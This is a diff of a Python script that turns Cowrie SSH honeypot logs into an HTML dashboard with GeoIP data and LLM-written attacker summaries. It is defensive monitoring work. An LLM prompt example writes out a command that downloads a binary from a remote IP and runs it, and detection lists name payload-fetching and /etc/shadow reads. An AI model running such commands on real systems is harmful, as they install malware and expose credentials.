@@ -2,20 +2,32 @@
 """
 Cowrie Honeypot Dashboard Generator
 Parses Cowrie JSON logs, does GeoIP lookups, generates a self-contained HTML dashboard.
+
+Fixes applied (2026-02-06):
+- H3: Atomic writes (temp+rename) for geoip_cache.json and description_cache.json
+- L5: Moved imports (math, random, re) to top of file
+- L7: Bare except → specific exception types in load_cache()
+- M5: Seed random with IP hash for deterministic command explanations
 """
 
-import json
-import re
 import glob
+import gzip
 import hashlib
+import json
+import math
 import os
+import random
+import re
 import sys
+import tempfile
 import time
 import urllib.request
 import urllib.error
 from collections import Counter, defaultdict
 from datetime import datetime, timezone, timedelta
+from html import escape as h
 from zoneinfo import ZoneInfo
+
 LOCAL_TZ = ZoneInfo("America/New_York")
 
 # Paths
@@ -23,7 +35,25 @@ SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 LOG_PATH = "/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
 CACHE_PATH = os.path.join(SCRIPT_DIR, "geoip_cache.json")
 OUTPUT_PATH = os.path.join(SCRIPT_DIR, "dashboard.html")
+CACHE_FILE = os.path.join(SCRIPT_DIR, "description_cache.json")
 
+
+def atomic_json_write(filepath, data, indent=2):
+    """Write JSON atomically using temp file + os.rename (H3 fix)."""
+    dirpath = os.path.dirname(filepath)
+    try:
+        fd, tmp_path = tempfile.mkstemp(dir=dirpath, suffix=".tmp")
+        with os.fdopen(fd, "w") as f:
+            json.dump(data, f, indent=indent)
+        os.rename(tmp_path, filepath)
+    except Exception as e:
+        print(f"[!] Atomic write failed for {filepath}: {e}")
+        try:
+            os.unlink(tmp_path)
+        except Exception:
+            pass
+        return False
+    return True
 
 
 def annotate_command(cmd):
@@ -77,11 +107,9 @@ def annotate_command(cmd):
         "cat /root/.bash_history": "history snooping",
     }
     
-    # Check exact matches
     if cmd_lower in annotations:
         return annotations[cmd_lower]
     
-    # Pattern-based matches (order matters — more specific first)
     patterns = [
         (r'export\s+HISTFILE\s*=\s*/dev/null', "anti-forensics: disable history"),
         (r'unset\s+HISTFILE', "anti-forensics: disable history"),
@@ -135,7 +163,6 @@ def annotate_command(cmd):
 
 def parse_log(path):
     """Parse Cowrie JSON log, skipping malformed lines. Handles .gz files."""
-    import gzip
     events = []
     if not os.path.exists(path):
         print(f"[!] Log file not found: {path}")
@@ -186,12 +213,12 @@ def load_geo_cache():
 
 
 def save_geo_cache(cache):
+    """Save geo cache atomically (H3 fix)."""
     now = datetime.now(timezone.utc).isoformat()
     for k, v in cache.items():
         if isinstance(v, dict) and "_cached_at" not in v:
             v["_cached_at"] = now
-    with open(CACHE_PATH, "w") as f:
-        json.dump(cache, f, indent=2)
+    atomic_json_write(CACHE_PATH, cache)
 
 
 def batch_geoip_lookup(ips, cache):
@@ -200,7 +227,6 @@ def batch_geoip_lookup(ips, cache):
     if not to_lookup:
         return cache
 
-    # Process in batches of 100
     for i in range(0, len(to_lookup), 100):
         batch = to_lookup[i:i+100]
         print(f"[*] GeoIP batch lookup: {len(batch)} IPs...")
@@ -240,7 +266,6 @@ def batch_geoip_lookup(ips, cache):
                         "country": "Unknown", "countryCode": "", "region": "",
                         "city": "", "lat": 0, "lon": 0, "isp": "Unknown", "org": ""
                     }
-        # Rate limiting: wait between batches
         if i + 100 < len(to_lookup):
             time.sleep(1)
 
@@ -248,14 +273,12 @@ def batch_geoip_lookup(ips, cache):
     return cache
 
 
-# Country code to flag emoji
 def flag_emoji(cc):
     if not cc or len(cc) != 2:
-        return "🏴"
+        return "\U0001f3f4"
     return chr(0x1F1E6 + ord(cc[0].upper()) - ord('A')) + chr(0x1F1E6 + ord(cc[1].upper()) - ord('A'))
 
 
-# Generate cute nicknames for IPs based on country + what they tried
 COUNTRY_FLAVORS = {
     "NL": ["tulip", "windmill", "gouda", "bike", "stroopwafel", "clog", "dutch"],
     "US": ["eagle", "burger", "yankee", "cowboy", "liberty", "star"],
@@ -285,11 +308,8 @@ def generate_nickname(ip, geo, creds_tried=None):
     
     cc = geo.get("countryCode", "").upper()
     flavors = COUNTRY_FLAVORS.get(cc, DEFAULT_FLAVORS)
-    
-    # Pick a flavor word based on IP hash for consistency
     flavor = flavors[hash(ip) % len(flavors)]
     
-    # Add a behavior hint from credentials if available
     suffix = ""
     if creds_tried:
         cred_str = " ".join(creds_tried).lower()
@@ -304,7 +324,6 @@ def generate_nickname(ip, geo, creds_tried=None):
         elif any(w in cred_str for w in ["miner", "eth", "bitcoin"]):
             suffix = "_crypto"
     
-    # Add a number if we've seen this combo before
     base = f"{flavor}{suffix}"
     _nickname_counter[base] += 1
     if _nickname_counter[base] > 1:
@@ -316,13 +335,12 @@ def generate_nickname(ip, geo, creds_tried=None):
     return nickname
 
 
-CACHE_FILE = "/home/dashboard/app/description_cache.json"
-
 def load_cache():
+    """Load description cache (L7 fix: specific exception types)."""
     try:
         with open(CACHE_FILE, "r") as f:
             cache = json.load(f)
-    except:
+    except (json.JSONDecodeError, IOError, OSError):
         return {}
     # Prune entries older than 30 days
     cutoff = (datetime.now(timezone.utc) - timedelta(days=30)).isoformat()
@@ -332,7 +350,6 @@ def load_cache():
             if v["_cached_at"] > cutoff:
                 pruned[k] = v
         elif isinstance(v, str):
-            # Legacy entry without timestamp - keep it, will get timestamp on next write
             pruned[k] = v
         else:
             pruned[k] = v
@@ -350,7 +367,7 @@ def _cache_get(cache, key):
     return v
 
 def save_cache(cache):
-    # Add _cached_at to entries being saved
+    """Save description cache atomically (H3 fix)."""
     now = datetime.now(timezone.utc).isoformat()
     out = {}
     for k, v in cache.items():
@@ -361,8 +378,7 @@ def save_cache(cache):
             out[k] = v
         else:
             out[k] = v
-    with open(CACHE_FILE, "w") as f:
-        json.dump(out, f, indent=2)
+    atomic_json_write(CACHE_FILE, out)
 
 
 def analyze_events(events, geo_cache):
@@ -381,22 +397,19 @@ def analyze_events(events, geo_cache):
     ip_last_seen = {}
     ip_creds = defaultdict(list)
     cred_combos = Counter()
-    timeline = Counter()  # hourly buckets
+    timeline = Counter()
     recent_events = []
-    successful_sessions = defaultdict(list)  # session -> commands
+    successful_sessions = defaultdict(list)
     session_ips = {}
     session_success = set()
     session_creds = {}
-
-    # Per-day tracking
-    LOCAL_TZ = ZoneInfo("America/New_York")
 
     daily_sessions = Counter()
     daily_login_attempts = Counter()
     daily_successful = Counter()
     daily_ips = defaultdict(set)
     daily_commands = Counter()
-    daily_ip_attempts = defaultdict(Counter)  # day -> {ip: count}
+    daily_ip_attempts = defaultdict(Counter)
     all_timestamps = []
 
     for e in events:
@@ -410,7 +423,6 @@ def analyze_events(events, geo_cache):
         if session and ip:
             session_ips[session] = ip
 
-        # Track timestamp for daily stats
         if ts:
             try:
                 dt_est = datetime.fromisoformat(ts.replace("Z", "+00:00")).astimezone(LOCAL_TZ)
@@ -445,7 +457,6 @@ def analyze_events(events, geo_cache):
                 if ip:
                     daily_ips[day_key].add(ip)
                     daily_ip_attempts[day_key][ip] += 1
-            # Timeline bucket
             try:
                 dt = datetime.fromisoformat(ts.replace("Z", "+00:00"))
                 dt_local = dt.astimezone(LOCAL_TZ)
@@ -453,7 +464,7 @@ def analyze_events(events, geo_cache):
                 timeline[bucket] += 1
             except (ValueError, AttributeError):
                 pass
-            recent_events.append({"ts": ts, "ip": ip, "action": f"Login attempt: {u}/{p}"})
+            recent_events.append({"ts": ts, "ip": ip, "action": f"Login attempt: {h(u)}/{h(p)}"})
 
         elif eid == "cowrie.login.success":
             stats["total_login_attempts"] += 1
@@ -469,7 +480,7 @@ def analyze_events(events, geo_cache):
             ip_creds[ip].append(combo)
             cred_combos[combo] += 1
             session_success.add(session)
-            session_creds[session] = f"{u}/{p}"
+            session_creds[session] = f"{h(u)}/{h(p)}"
             if day_key:
                 daily_login_attempts[day_key] += 1
                 daily_successful[day_key] += 1
@@ -483,30 +494,28 @@ def analyze_events(events, geo_cache):
                 timeline[bucket] += 1
             except (ValueError, AttributeError):
                 pass
-            recent_events.append({"ts": ts, "ip": ip, "action": f"✅ LOGIN SUCCESS: {u}/{p}"})
+            recent_events.append({"ts": ts, "ip": ip, "action": f"\u2705 LOGIN SUCCESS: {h(u)}/{h(p)}"})
 
         elif eid == "cowrie.command.input":
             stats["commands_executed"] += 1
             cmd = e.get("input", "")
             if session in session_success:
                 successful_sessions[session].append({"ts": ts, "cmd": cmd})
-            recent_events.append({"ts": ts, "ip": ip, "action": f"Command: {cmd}"})
+            recent_events.append({"ts": ts, "ip": ip, "action": f"Command: {h(cmd)}"})
             if day_key:
                 daily_commands[day_key] += 1
 
         elif eid in ("cowrie.session.file_download", "cowrie.session.file_upload"):
             stats["files_downloaded"] += 1
             url = e.get("url", e.get("filename", "?"))
-            recent_events.append({"ts": ts, "ip": ip, "action": f"File: {url}"})
+            recent_events.append({"ts": ts, "ip": ip, "action": f"File: {h(url)}"})
 
     stats["unique_ips"] = len(stats["unique_ips"])
 
-    # Sort timeline
     sorted_timeline = sorted(timeline.items())
     timeline_labels = [t[0] for t in sorted_timeline]
     timeline_data = [t[1] for t in sorted_timeline]
 
-    # Top attackers
     top_attackers = []
     for ip, count in ip_attempts.most_common(10):
         geo = geo_cache.get(ip, {})
@@ -522,13 +531,9 @@ def analyze_events(events, geo_cache):
             "nickname": nickname,
         })
 
-    # Top creds
     top_creds = cred_combos.most_common(20)
-
-    # Recent events (last 20)
     recent_events = recent_events[-20:]
 
-    # Map markers
     markers = []
     seen_ips = set()
     for ip, count in ip_attempts.most_common(100):
@@ -554,7 +559,6 @@ def analyze_events(events, geo_cache):
             "nickname": nickname,
         })
 
-    # Also add IPs with sessions but no login attempts (just connected)
     for ip in list(set(session_ips.values())):
         if ip not in seen_ips:
             geo = geo_cache.get(ip, {})
@@ -568,8 +572,6 @@ def analyze_events(events, geo_cache):
                     "creds": [],
                 })
 
-    # Spread out overlapping markers (same lat/lon get fanned out in a circle)
-    import math
     coord_counts = Counter((round(m["lat"], 1), round(m["lon"], 1)) for m in markers)
     coord_indices = {}
     for m in markers:
@@ -579,19 +581,16 @@ def analyze_events(events, geo_cache):
             idx = coord_indices.get(key, 0)
             coord_indices[key] = idx + 1
             angle = (2 * math.pi * idx) / total
-            spread = 0.04 * min(total, 5)  # very subtle: max 0.2 degrees (~22km)
+            spread = 0.04 * min(total, 5)
             m["lat"] += math.sin(angle) * spread
             m["lon"] += math.cos(angle) * spread
 
-    # Successful sessions with commands
     success_data = []
     for sid, cmds in successful_sessions.items():
         ip = session_ips.get(sid, "?")
         success_data.append({"session": sid, "ip": ip, "commands": cmds, "creds": session_creds.get(sid, "unknown")})
-    # Sort by first command timestamp, most recent first
     success_data.sort(key=lambda s: s["commands"][0]["ts"] if s["commands"] else "", reverse=True)
 
-    # Build daily breakdown
     today_est = datetime.now(LOCAL_TZ).strftime("%Y-%m-%d")
     all_days = sorted(set(
         list(daily_sessions.keys()) + list(daily_login_attempts.keys()) +
@@ -600,7 +599,6 @@ def analyze_events(events, geo_cache):
 
     daily_breakdown = []
     for day in all_days[:30]:
-        # Find top attacker IP for this day
         top_ip = ""
         top_nick = ""
         if daily_ip_attempts[day]:
@@ -618,7 +616,6 @@ def analyze_events(events, geo_cache):
             "top_attacker_nick": top_nick,
         })
 
-    # Today's stats
     today_stats = {
         "sessions": daily_sessions.get(today_est, 0),
         "login_attempts": daily_login_attempts.get(today_est, 0),
@@ -627,7 +624,6 @@ def analyze_events(events, geo_cache):
         "commands": daily_commands.get(today_est, 0),
     }
 
-    # Days active and attacks per day
     if all_timestamps:
         first_event = min(all_timestamps)
         days_active = max(1, (datetime.now(LOCAL_TZ) - first_event).days + 1)
@@ -676,7 +672,7 @@ def ollama_healthy():
         return False
 
 
-_ollama_is_healthy = None  # Cached per-run
+_ollama_is_healthy = None
 
 def _check_ollama_once():
     global _ollama_is_healthy
@@ -688,7 +684,7 @@ def _check_ollama_once():
 
 
 def llm_generate(prompt, model="qwen3:4b", temperature=0.5, max_tokens=30):
-    """Call Ollama to generate text using raw mode (no chat template). Falls back to empty string on failure."""
+    """Call Ollama to generate text using raw mode. Falls back to empty string on failure."""
     if not _check_ollama_once():
         return ""
     try:
@@ -720,7 +716,6 @@ def generate_greatest_hits(data):
         city = attacker.get("city", "")
         isp = attacker.get("isp", "Unknown")
 
-        # Gather their commands
         cmds = []
         for s in data.get("successful_sessions", []):
             if s["ip"] == ip:
@@ -729,47 +724,41 @@ def generate_greatest_hits(data):
         creds = ip_creds.get(ip, [])
         creds_str = ", ".join(creds[:5]) if creds else "none captured"
 
-        # Check cache first
         cmd_hash = hashlib.md5(str(sorted(set(cmds))).encode()).hexdigest()[:8] if cmds else "nocmds"
         cache_key = f"gh_{ip}_{cmd_hash}"
         
         if cache_key in desc_cache:
             story = _cache_get(desc_cache, cache_key)
         elif cmds:
-            # Try LLM with qwen3:4b
-            # Extract just the key command names, not the full args
-            import re
             key_cmds = set()
             for cmd in cmds[:10]:
-                # Get the base command names
                 for part in re.split(r'[;|&]', cmd):
                     part = part.strip()
                     base = part.split()[0] if part.split() else ""
-                    base = base.split("/")[-1]  # strip paths
+                    base = base.split("/")[-1]
                     if base and base not in ("export", "echo", "2", "head", "cut", "awk", "sed", "grep", "tr"):
                         key_cmds.add(base)
             cmd_list = ", ".join(sorted(key_cmds)[:8])
             prompt = f"""SSH honeypot attacker summary. Explain what they did and WHY it matters. Be technical and specific.
 
 Attacker: 249 attempts, 84 commands. Ran: cat, dmidecode, free, lscpu, lspci, nproc, uname. From: Netherlands, DigitalOcean.
-→ Persistent scanner from a cloud VPS. Full hardware audit (CPU, GPU, RAM, PCI devices) — profiling this box for cryptomining potential. 249 attempts shows automated tooling.
+\u2192 Persistent scanner from a cloud VPS. Full hardware audit (CPU, GPU, RAM, PCI devices) \u2014 profiling this box for cryptomining potential. 249 attempts shows automated tooling.
 
 Attacker: 12 attempts, 3 commands. Ran: wget, chmod, bash. From: China, Alibaba Cloud.
-→ Smash-and-grab: downloaded a remote script and executed it immediately. Likely deploying a cryptominer or botnet agent. No recon, straight to payload delivery.
+\u2192 Smash-and-grab: downloaded a remote script and executed it immediately. Likely deploying a cryptominer or botnet agent. No recon, straight to payload delivery.
 
 Attacker: 75 attempts, 0 commands. Credentials tried: ubuntu:temponly, slurm:111111, servidor:111111. From: Germany, Hetzner.
-→ Pure credential brute-forcer. 75 attempts with service-specific passwords (slurm = HPC clusters, servidor = Portuguese for server). Scanning for misconfigured compute nodes.
+\u2192 Pure credential brute-forcer. 75 attempts with service-specific passwords (slurm = HPC clusters, servidor = Portuguese for server). Scanning for misconfigured compute nodes.
 
 Attacker: {count} attempts, {len(cmds)} commands. Ran: {cmd_list}. Creds: {creds_str}. From: {country}, {isp}.
-→"""
+\u2192"""
             story = llm_generate(prompt, temperature=0.7, max_tokens=60)
             if not story or any(story.lower().startswith(p) for p in ["here", "i can", "we ", "okay", "the attacker", "this command", "this is", "let me", "it looks", "the user"]):
-                story = classify_commands_fast(cmds)
+                story = classify_commands_fast(cmds, ip)
             if not story:
                 story = "Got in, poked around, ran some commands."
             desc_cache[cache_key] = story
         else:
-            # Generate a more informative description even without commands
             cred_list = creds[:8]
             cred_types = []
             for c in cred_list:
@@ -785,14 +774,11 @@ Attacker: {count} attempts, {len(cmds)} commands. Ran: {cmd_list}. Creds: {creds
             story = f"Brute-force scanner ({type_str} credentials). {count} attempts with combos like {creds_str}. Never breached."
             desc_cache[cache_key] = story
         if story:
-            # Clean up LLM artifacts
             for prefix in [f"Nickname: {nick}", f"{nick}:", f'"{nick}"', f"**{nick}**"]:
                 if story.lower().startswith(prefix.lower()):
                     story = story[len(prefix):].lstrip(" -:,")
-            # Kill "Or:" alternatives — just keep the first sentence
             if " Or:" in story or " Or," in story:
                 story = story.split(" Or:")[0].split(" Or,")[0].strip()
-            # Strip quotes and take first sentence if multiple
             story = story.strip('"').strip()
             sentences = story.split('. ')
             if len(sentences) > 2:
@@ -802,7 +788,6 @@ Attacker: {count} attempts, {len(cmds)} commands. Ran: {cmd_list}. Creds: {creds
         if not story:
             story = f"Knocked {count} times from {country}. {'Got in and ran recon.' if cmds else 'Never made it past the door.'}"
 
-        # Time range (convert UTC to EST)
         first = data.get("ip_first_seen", {}).get(ip, "")
         last = data.get("ip_last_seen", {}).get(ip, "")
         if first and last:
@@ -815,15 +800,15 @@ Attacker: {count} attempts, {len(cmds)} commands. Ran: {cmd_list}. Creds: {creds
                 l_short = l_local.strftime("%H:%M")
                 f_date = f_local.strftime("%Y-%m-%d")
                 l_date = l_local.strftime("%Y-%m-%d")
-            except:
+            except (ValueError, TypeError):
                 f_short = first[11:16]
                 l_short = last[11:16]
                 f_date = first[:10]
                 l_date = last[:10]
             if f_date == l_date:
-                time_range = f"{f_short}–{l_short}"
+                time_range = f"{f_short}\u2013{l_short}"
             else:
-                time_range = f"{f_date[5:]} {f_short} – {l_date[5:]} {l_short}"
+                time_range = f"{f_date[5:]} {f_short} \u2013 {l_date[5:]} {l_short}"
         else:
             time_range = ""
 
@@ -831,7 +816,7 @@ Attacker: {count} attempts, {len(cmds)} commands. Ran: {cmd_list}. Creds: {creds
             "nick": nick,
             "ip": ip,
             "count": count,
-            "flag": attacker.get("flag", "🏴"),
+            "flag": attacker.get("flag", "\U0001f3f4"),
             "story": story,
             "cmds": len(cmds),
             "time_range": time_range,
@@ -841,42 +826,40 @@ Attacker: {count} attempts, {len(cmds)} commands. Ran: {cmd_list}. Creds: {creds
     return hits
 
 
-def classify_commands_fast(cmds):
-    """Quick pattern-match for common attacker behaviors. Returns a varied explanation."""
-    import random
+def classify_commands_fast(cmds, ip=None):
+    """Quick pattern-match for common attacker behaviors.
+    M5 fix: seed random with IP hash for deterministic choices."""
+    # Seed with IP for deterministic output per-attacker
+    rng = random.Random(hash(ip) if ip else 0)
     cmd_str = " ".join(cmds).lower()
     if not cmds:
-        return random.choice([
+        return rng.choice([
             "Logged in, looked around, got bored, left.",
             "Opened the door, peeked inside, closed it again.",
             "Connected and immediately lost interest.",
         ])
     
-    # Long commands still match patterns
-    # (removed LLM deferral)
-    pass
-    
     patterns = [
         (["uname", "/proc/cpuinfo", "nproc"], [
-            "Fingerprinting the system — checking OS, CPU, and hardware specs.",
+            "Fingerprinting the system \u2014 checking OS, CPU, and hardware specs.",
             "Casing the joint: pulled system info to see what they're working with.",
-            "Standard recon script — uname, CPU count, the usual checklist.",
+            "Standard recon script \u2014 uname, CPU count, the usual checklist.",
             "Ran the attacker's equivalent of kicking the tires.",
-            "Checking under the hood — OS version, architecture, processor count.",
+            "Checking under the hood \u2014 OS version, architecture, processor count.",
             "First thing they did? See if the hardware's worth compromising.",
-            "Automated fingerprinting — this box got sized up in seconds.",
+            "Automated fingerprinting \u2014 this box got sized up in seconds.",
             "The digital equivalent of reading the label before opening the package.",
         ]),
         (["wget http", "curl http", "chmod +x", "./"], [
             "Downloaded and attempted to execute a remote payload.",
             "Pulled a binary from the internet and tried to run it. Classic.",
-            "Fetch, chmod, execute — the attacker speedrun trifecta.",
+            "Fetch, chmod, execute \u2014 the attacker speedrun trifecta.",
             "Tried to download and run something nasty from a remote server.",
         ]),
         (["cat /etc/passwd", "cat /etc/shadow"], [
             "Went straight for the credential files.",
             "Trying to harvest usernames and password hashes.",
-            "Raiding /etc/passwd — hunting for accounts to crack.",
+            "Raiding /etc/passwd \u2014 hunting for accounts to crack.",
         ]),
         (["crontab", "systemctl", "/etc/init.d"], [
             "Attempting to set up persistence via scheduled tasks.",
@@ -885,10 +868,10 @@ def classify_commands_fast(cmds):
         ]),
         (["history", ".bash_history"], [
             "Snooping through command history for credentials or clues.",
-            "Reading the previous tenant's diary — checking bash history.",
+            "Reading the previous tenant's diary \u2014 checking bash history.",
         ]),
         (["ifconfig", "ip addr", "hostname"], [
-            "Network recon — mapping the local network layout.",
+            "Network recon \u2014 mapping the local network layout.",
             "Checking what network this box sits on.",
         ]),
         (["iptables", "firewall"], [
@@ -907,27 +890,27 @@ def classify_commands_fast(cmds):
     
     for keywords, explanations in patterns:
         if any(kw in cmd_str for kw in keywords):
-            return random.choice(explanations)
+            return rng.choice(explanations)
     
     if len(cmds) <= 2 and all(len(c) < 30 for c in cmds):
-        return random.choice([
-            "Quick recon — peeked around and left.",
+        return rng.choice([
+            "Quick recon \u2014 peeked around and left.",
             "Brief visit. Ran a command or two and bounced.",
             "In and out in seconds. Just checking if anyone's home.",
         ])
     
-    return None  # Complex enough to warrant LLM
+    return None
+
 
 def generate_command_explanations(data):
-    """Generate explanations for commands in successful sessions.
-    3-layer system: Layer 2 (pattern match) → Layer 3 (LLM for novel, cached)."""
+    """Generate explanations for commands in successful sessions."""
     explained = []
     desc_cache = load_cache()
     geo_cache = data.get("geo_cache", {})
     ip_creds_map = data.get("ip_creds", {})
     
     llm_calls = 0
-    MAX_LLM_CALLS = 15  # Cap fresh LLM calls per run (cached ones are free)
+    MAX_LLM_CALLS = 15
     for s in data.get("successful_sessions", []):
         geo = geo_cache.get(s["ip"], {})
         nick = generate_nickname(s["ip"], geo, ip_creds_map.get(s["ip"], []))
@@ -941,14 +924,11 @@ def generate_command_explanations(data):
         cache_key = f"cmd_{s['ip']}_{cmd_hash}"
         
         if cache_key in desc_cache:
-            # Layer 0: cached result (from any previous layer)
             explanation = _cache_get(desc_cache, cache_key)
         else:
-            # Layer 2: try pattern matching first (instant)
-            explanation = classify_commands_fast(cmds)
+            explanation = classify_commands_fast(cmds, s["ip"])
             
             if explanation is None:
-                # Layer 3: LLM for novel/complex sessions
                 if llm_calls < MAX_LLM_CALLS:
                     llm_calls += 1
                     country = geo.get("country", "Unknown")
@@ -956,15 +936,14 @@ def generate_command_explanations(data):
                     prompt = f"""SSH honeypot session one-liner. Be specific and technical about what the attacker did.
 
 Session: root logged in, ran: uname -a; cat /proc/cpuinfo; free -m; df -h
-→ Full system profiling: OS version, CPU specs, available RAM and disk. Evaluating this box as a cryptomining candidate.
+\u2192 Full system profiling: OS version, CPU specs, available RAM and disk. Evaluating this box as a cryptomining candidate.
 
 Session: deploy logged in, ran: wget http://45.33.1.2/x86; chmod 777 x86; ./x86
-→ Payload delivery: fetched and executed a binary from a C2 server. Likely a Mirai variant or cryptominer dropper.
+\u2192 Payload delivery: fetched and executed a binary from a C2 server. Likely a Mirai variant or cryptominer dropper.
 
 Session: {creds_used} logged in, ran: {cmd_str}
-→"""
+\u2192"""
                     explanation = llm_generate(prompt, temperature=0.7, max_tokens=40)
-                    # Filter out bad LLM outputs
                     bad = False
                     if not explanation or len(explanation) < 10:
                         bad = True
@@ -977,11 +956,9 @@ Session: {creds_used} logged in, ran: {cmd_str}
                     if bad:
                         explanation = None
                 
-                # Fallback if LLM failed or over cap
                 if not explanation:
                     explanation = "Got in, ran some commands, left."
             
-            # Cache permanently
             desc_cache[cache_key] = explanation
         
         explained.append({
@@ -1006,7 +983,6 @@ def generate_html(data):
     timeline_labels = json.dumps(data["timeline_labels"])
     timeline_data = json.dumps(data["timeline_data"])
 
-    # Generate LLM-powered content
     print("[*] Generating greatest hits (LLM)...")
     greatest_hits = generate_greatest_hits(data)
     greatest_hits_html = ""
@@ -1014,9 +990,9 @@ def generate_html(data):
         greatest_hits_html += f"""
         <div class="hit-card">
             <div class="hit-nick" onclick="flyToAttacker('{hit['nick']}')">{hit['flag']} {hit['nick']}</div>
-            <div class="hit-stat">{hit['count']} attempts{' · ' + str(hit['cmds']) + ' commands' if hit['cmds'] else ''}</div>
+            <div class="hit-stat">{hit['count']} attempts{' \u00b7 ' + str(hit['cmds']) + ' commands' if hit['cmds'] else ''}</div>
             <div class="hit-story">{hit['story']}</div>
-            <div style="color:#555;font-size:0.75em;margin-top:4px;">⏰ {hit['time_range']}</div>
+            <div style="color:#555;font-size:0.75em;margin-top:4px;">\u23f0 {hit['time_range']}</div>
         </div>"""
     if not greatest_hits_html:
         greatest_hits_html = '<div style="color:#666;">No attackers to profile yet.</div>'
@@ -1024,19 +1000,17 @@ def generate_html(data):
     print("[*] Generating command explanations (LLM)...")
     explained_sessions = generate_command_explanations(data)
 
-    # Build leaderboard rows
     leaderboard_rows = ""
     for i, a in enumerate(data["top_attackers"], 1):
-        city_or_country = a['city'] if a['city'] else a['country']
+        city_or_country = h(a['city']) if a['city'] else h(a['country'])
         leaderboard_rows += f"""
         <tr>
             <td><span class="nick-link" onclick="flyToAttacker(&quot;{a['nickname']}&quot;)">{a['nickname']}</span><br><span style="color:#666;font-size:0.8em">{a['ip']}</span></td>
             <td>{a['flag']} {city_or_country}</td>
-            <td class="hide-mobile">{a['isp']}</td>
+            <td class="hide-mobile">{h(a['isp'])}</td>
             <td class="glow">{a['count']}</td>
         </tr>"""
 
-    # Recent activity
     activity_rows = ""
     for ev in reversed(data["recent_events"]):
         try:
@@ -1052,10 +1026,9 @@ def generate_html(data):
             <span class="ts">{ts_short}</span>
             <span class="nick-link" onclick="flyToAttacker(&quot;{nick}&quot;)">{nick}</span>
             <span class="ip">{ev['ip']}</span>
-            <span class="action {action_class}">{ev['action']}</span>
+            <span class="action {action_class}">{h(ev['action'])}</span>
         </div>"""
 
-    # Successful sessions terminal (with LLM explanations)
     terminal_content = ""
     if explained_sessions:
         for s in explained_sessions:
@@ -1070,16 +1043,16 @@ def generate_html(data):
                     utc_dt = datetime.fromisoformat(first_ts_raw.replace("Z", "+00:00")[:26]).replace(tzinfo=timezone.utc)
                     local_dt = utc_dt.astimezone(ZoneInfo("America/New_York"))
                     first_ts = local_dt.strftime("%Y-%m-%d %H:%M %Z")
-                except:
+                except (ValueError, TypeError):
                     first_ts = first_ts_raw[:16].replace("T", " ")
             else:
                 first_ts = ""
-            terminal_content += f'<div class="term-header">🎭 <span class="nick-link" onclick="flyToAttacker(&quot;{nick}&quot;)">{nick}</span> ({s["ip"]}) — {loc} <span style="color:#555;font-size:0.85em">· {first_ts}</span></div>\n'
-            terminal_content += f'<div class="term-line" style="color:#ff9944;font-style:italic;">💡 {s["explanation"]}</div>\n'
+            terminal_content += f'<div class="term-header">\U0001f3ad <span class="nick-link" onclick="flyToAttacker(&quot;{nick}&quot;)">{nick}</span> ({s["ip"]}) \u2014 {loc} <span style="color:#555;font-size:0.85em">\u00b7 {first_ts}</span></div>\n'
+            terminal_content += f'<div class="term-line" style="color:#ff9944;font-style:italic;">\U0001f4a1 {s["explanation"]}</div>\n'
             for cmd in s["commands"]:
                 annotation = annotate_command(cmd["cmd"])
                 note_html = f' <span class="cmd-note">// {annotation}</span>' if annotation else ''
-                terminal_content += f'<div class="term-line"><span class="term-prompt">{nick}@honeypot:~$ </span>{cmd["cmd"]}{note_html}</div>\n'
+                terminal_content += f'<div class="term-line"><span class="term-prompt">{h(nick)}@honeypot:~$ </span>{h(cmd["cmd"])}{note_html}</div>\n'
     elif data["successful_sessions"]:
         for s in data["successful_sessions"]:
             geo = geo_cache.get(s["ip"], {})
@@ -1087,19 +1060,18 @@ def generate_html(data):
             city = geo.get("city", "")
             country = geo.get("country", "Unknown")
             loc = f"{city}, {country}" if city else country
-            terminal_content += f'<div class="term-header">🎭 <span class="nick-link" onclick="flyToAttacker(&quot;{nick}&quot;)">{nick}</span> ({s["ip"]}) — {loc}</div>\n'
+            terminal_content += f'<div class="term-header">\U0001f3ad <span class="nick-link" onclick="flyToAttacker(&quot;{nick}&quot;)">{nick}</span> ({s["ip"]}) \u2014 {loc}</div>\n'
             for cmd in s["commands"]:
                 ts_short = cmd["ts"][:19].replace("T", " ") if cmd["ts"] else ""
                 annotation = annotate_command(cmd["cmd"])
                 note_html = f' <span class="cmd-note">// {annotation}</span>' if annotation else ''
-                terminal_content += f'<div class="term-line"><span class="term-prompt">{nick}@honeypot:~$ </span>{cmd["cmd"]}{note_html}</div>\n'
+                terminal_content += f'<div class="term-line"><span class="term-prompt">{h(nick)}@honeypot:~$ </span>{h(cmd["cmd"])}{note_html}</div>\n'
     else:
         terminal_content = '<div class="term-line" style="color:#666;">No successful logins captured yet. The bots are still trying...</div>'
 
-    # Daily breakdown rows
     daily_rows = ""
     for d in data["daily_breakdown"]:
-        attacker_cell = f'<span class="nick-link" onclick="flyToAttacker(&quot;{d["top_attacker_nick"]}&quot;)">{d["top_attacker_nick"]}</span> <span style="color:#555">({d["top_attacker_ip"]})</span>' if d["top_attacker_ip"] else '<span style="color:#555">—</span>'
+        attacker_cell = f'<span class="nick-link" onclick="flyToAttacker(&quot;{d["top_attacker_nick"]}&quot;)">{d["top_attacker_nick"]}</span> <span style="color:#555">({d["top_attacker_ip"]})</span>' if d["top_attacker_ip"] else '<span style="color:#555">\u2014</span>'
         daily_rows += f"""
         <tr>
             <td class="glow">{d['date']}</td>
@@ -1474,7 +1446,6 @@ def generate_html(data):
     .panel > div {{ overflow-x: auto; -webkit-overflow-scrolling: touch; }}
     .panel h2 {{ font-size: 0.85em; letter-spacing: 1px; }}
 
-    /* Stats: 2x2 grid instead of horizontal row */
     .stats-bar {{ display: grid; grid-template-columns: 1fr 1fr; gap: 8px; padding: 10px 8px; }}
     .stat {{ min-width: unset; }}
     .stat .value {{ font-size: 1.3em; }}
@@ -1484,15 +1455,11 @@ def generate_html(data):
     .alltime-value {{ font-size: 0.95em; }}
     .alltime-label {{ font-size: 0.5em; }}
 
-    /* Activity feed: stack ts/ip/action vertically */
     .activity-row {{ flex-wrap: wrap; gap: 2px; padding: 8px 6px; }}
     .activity-row .ts {{ min-width: unset; font-size: 0.7em; width: 100%; }}
     .activity-row .ip {{ min-width: unset; font-size: 0.8em; }}
     .activity-row .action {{ font-size: 0.75em; width: 100%; max-height: 60px; }}
 
-    /* Tables: hide less important columns on mobile */
-    table {{ width: 100%; table-layout: fixed; }}
-    th, td {{ padding: 6px 4px; font-size: 0.75em; word-break: break-word; white-space: normal; }}
     .hide-mobile {{ display: none !important; }}
